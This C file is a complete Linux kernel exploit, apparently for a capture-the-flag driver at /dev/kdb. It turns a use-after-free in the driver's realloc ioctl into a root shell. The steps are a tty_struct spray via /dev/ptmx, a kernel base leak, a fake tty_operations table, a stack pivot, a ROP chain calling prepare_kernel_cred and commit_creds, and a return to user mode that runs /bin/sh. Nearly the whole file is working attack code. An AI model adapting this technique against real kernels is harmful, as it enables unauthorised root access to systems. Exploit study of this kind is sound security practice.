#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

// This ioctl is here to allocate a node
// we will be giving the name and the size
// of the node and then it will be allocated
// The size should be higher than 0xff
#define IOCTL_ALLOC 0x13371338

// ioctl to read buffer data
// I will be using it to leak somedata
// when UAF.
// it will take 0x30 bytes of data.
#define IOCTL_READ 0x13371339

// ioctl to fill that buffer
// it can be used after the UAF too.
// it will take 0x30 bytes of data.
#define IOCTL_WRITE 0x1337133a

// ioctl to free the node and unlink from
// the doubly linked list.
#define IOCTL_FREE 0x1337133d

// realloc ioctl
// actually the bug is here, it will free our buffer
// by providing a bigger size than the actual size of the chunk
// exactly userland_buff = 0xffffffffffffffff-0x100 and local_20 = 0x100
// Then we will trigger a UAF without unlink.
#define IOCTL_REALLOC 0x1337133f


// My struct for allocation
// as it takes input of 0x28
// name + size
struct node_alloc{
	char name[0x20];
	unsigned long size;	

} node_alloc;


// My struct for read and write
struct node_rw{
	char name[0x20];
	char* userland_buff;
	unsigned long local_20;

} node_rw;

struct trap_frame{
	char* rip;
	unsigned long cs;
	unsigned long rflags;
	char* rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void save_state(void){
	asm volatile(   "mov tf+8, cs;"
			"pushf;"
			"pop tf+16;"
			"mov tf+24, rsp;"
			"mov tf+32, ss;"
			);

}

#define KERN_OFFSET 0x21bea0

unsigned long *(prepare_kernel_cred)(int);
void *(commit_creds)(void);


// This function will show us the leaks
// but return the kernel base address at the same
// time.
unsigned long show_leaks(struct node_rw* node, int size){
	int i;
	unsigned long* ptr = (unsigned long *)(node->userland_buff);
	//for(i=0; i<(size>>3); i++)
	//	printf("QWORD %d : %p\n", i, ptr[i]);
	

	unsigned long kern_base = ptr[3] - KERN_OFFSET;
	printf("Kernel base @ %p\n", kern_base);
	return kern_base;
}

void shell(void){
	char* argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);

}

int main(){
	/* I will be using tty_struct attack for this
	 * as we cant't allocate smaller than 0xff
	 * This struct is of size of 0x2e0 so we can use it
	 * as our UAF buffer.
	 *
	 */
	// Open the device.
	int fd = open("/dev/kdb", O_RDWR);
	
	// Fill our trap frame struct.
	save_state();

	// My node name is MAHER
	strcpy(node_alloc.name, "MAHER");
	node_alloc.size = 0x2e0;
	ioctl(fd, IOCTL_ALLOC, &node_alloc);
	

	// Now we can just realloc to free and get a UAF
	node_rw.userland_buff = 0x0;
	node_rw.local_20 = 0xffffffffffffffff;
	strcpy(node_rw.name, node_alloc.name);
	ioctl(fd, IOCTL_REALLOC, &node_rw);

	// Now we open /dev/ptmx just to fill our UAF buffer
	// with it's tty_struct.
	int ptmx = open("/dev/ptmx", O_RDWR|O_NOCTTY);

	//char buf[0x2e0];
	//memset(buf, 0x4d, sizeof(buf));
	//setxattr("/tmp", "x", buf, 0x2e0, XATTR_CREATE);

	// Now we can leak something out of that tty_struct.
	node_rw.userland_buff = (char*)malloc(node_alloc.size);
	node_rw.local_20 = 0x0;
	ioctl(fd, IOCTL_READ, &node_rw);

	unsigned long kern_base = show_leaks(&node_rw, node_alloc.size);

	// Gadget here 0xffffffff8102a4f4 : mov esp, 0x83cb89cf ; ret
	unsigned long pivot = kern_base + 0x2a4f4;
	// 0xffffffff8113e858 : swapgs ; ret
	unsigned long swapgs = kern_base + 0x13e858;
	// ffffffff8113e030:	48 cf                	iretq
	unsigned long iretq = kern_base + 0x13e030;
	// 0xffffffff810a23cd : pop rdi ; ret
	unsigned long pop_rdi = kern_base + 0xa23cd;

	//0xffffffff810e4c4a : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff810e4c46 ; pop rbp ; ret
	unsigned long mov_rdi_rax_pop_rbp = kern_base + 0xe4c4a;

	// 0xffffffff810003ec : pop rsi ; pop rbp ; ret
	unsigned long pop_rsi = kern_base + 0x3ec;

	// 0xffffffff810daa9d : pop rcx ; pop rsi ; pop rdi ; ret
	unsigned long pop_rcx_rsi_rdi = kern_base + 0xdaa9d;

	unsigned long commit_creds = kern_base + 0x3d3a0;
	unsigned long prepare_kernel_cred = kern_base + 0x3d1a0;

	unsigned long *fake_tty_operations = (unsigned long *)mmap(NULL,
			0x4000,
			PROT_READ|PROT_WRITE,
			MAP_ANONYMOUS|MAP_PRIVATE,
			-1,
			0
			);

	// When close is called, we control RIP.
	*(fake_tty_operations+0x4) = pivot;

	// Alloc a new fake tty_struct
	// and change the legit tty_operations pointer to 
	// the fake one.
	unsigned long* fake_tty_struct = (unsigned long*)node_rw.userland_buff;
	fake_tty_struct += 3;

	*(fake_tty_struct) = (unsigned long)fake_tty_operations;

	// Update the buffer in node_rw
	ioctl(fd, IOCTL_WRITE, &node_rw);

	char* stack = (char *)mmap((void *)0x83cb8000,
					0x4000,
					PROT_READ|PROT_WRITE,
					MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
					-1,
					0
					);

	stack += 0x9cf;
	unsigned long* fake_stack = (unsigned long*)stack;

	*fake_stack++ = pop_rdi;
	*fake_stack++ = 0x0;
	*fake_stack++ = prepare_kernel_cred;
	*fake_stack++ = pop_rcx_rsi_rdi;
	*fake_stack++ = 0x0;
	*fake_stack++ = 0x1;
	*fake_stack++ = 0x0;
	*fake_stack++ = mov_rdi_rax_pop_rbp;
	*fake_stack++ = 0x0;
	*fake_stack++ = commit_creds;
	*fake_stack++ = swapgs;
	*fake_stack++ = iretq;
	*fake_stack++ = (unsigned long)&shell;
	*fake_stack++ = tf.cs;
	*fake_stack++ = tf.rflags;
	*fake_stack++ = (unsigned long)tf.rsp;
	*fake_stack++ = tf.ss;
	
	// Trigger.
	close(ptmx);

	// Free our files.
	close(fd);
	return 0;
}
